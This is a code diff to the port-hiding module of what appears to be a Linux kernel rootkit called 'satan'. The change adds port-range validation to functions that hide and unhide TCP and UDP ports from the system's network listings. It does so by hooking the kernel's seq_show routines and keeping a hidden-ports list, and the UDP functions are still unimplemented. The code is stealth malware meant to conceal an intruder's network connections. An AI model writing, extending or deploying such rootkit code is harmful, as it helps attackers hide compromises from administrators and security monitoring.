@@ -10,6 +10,15 @@
 #define PORT_NUM_HEX_STR_LEN 8
 #define TMPSZ 150
 
+#define PORT_MIN 1
+#define PORT_MAX 65535
+
+#define RETURN_IF_PORT_INVALID(port_num)                              \
+        if (port_num < PORT_MIN || port_num > PORT_MAX) {             \
+                pr_alert("satan: port: invalid port %d\n", port_num); \
+                return 1;                                             \
+        }
+
 
 static int satan_port_hook_seq_show(void);
 static int satan_port_unhook_seq_show(void);
@@ -55,6 +64,8 @@ void satan_port_exit(void)
 int satan_port_hide(unsigned int port_num)
 {
         int ret = 0;
+
+        RETURN_IF_PORT_INVALID(port_num);
         ret += satan_port_tcp_hide(port_num);
         ret += satan_port_udp_hide(port_num);
         return ret;
@@ -69,6 +80,8 @@ int satan_port_hide(unsigned int port_num)
 int satan_port_unhide(unsigned int port_num)
 {
         int ret = 0;
+
+        RETURN_IF_PORT_INVALID(port_num);
         ret += satan_port_tcp_unhide(port_num);
         ret += satan_port_udp_unhide(port_num);
         return ret;
@@ -83,6 +96,7 @@ int satan_port_unhide(unsigned int port_num)
  */
 int satan_port_tcp_hide(unsigned int port_num)
 {
+        RETURN_IF_PORT_INVALID(port_num);
         return hidden_ports_list_add(port_num);
 }
 
@@ -94,6 +108,7 @@ int satan_port_tcp_hide(unsigned int port_num)
  */
 int satan_port_tcp_unhide(unsigned int port_num)
 {
+        RETURN_IF_PORT_INVALID(port_num);
         return hidden_ports_list_del(port_num);
 }
 
@@ -105,6 +120,8 @@ int satan_port_tcp_unhide(unsigned int port_num)
  */
 int satan_port_udp_hide(unsigned int port_num)
 {
+        RETURN_IF_PORT_INVALID(port_num);
+
         // Not implemented yet.
         return 0;
 }
@@ -117,6 +134,8 @@ int satan_port_udp_hide(unsigned int port_num)
  */
 int satan_port_udp_unhide(unsigned int port_num)
 {
+        RETURN_IF_PORT_INVALID(port_num);
+
         // Not implemented yet.
         return 0;
 }
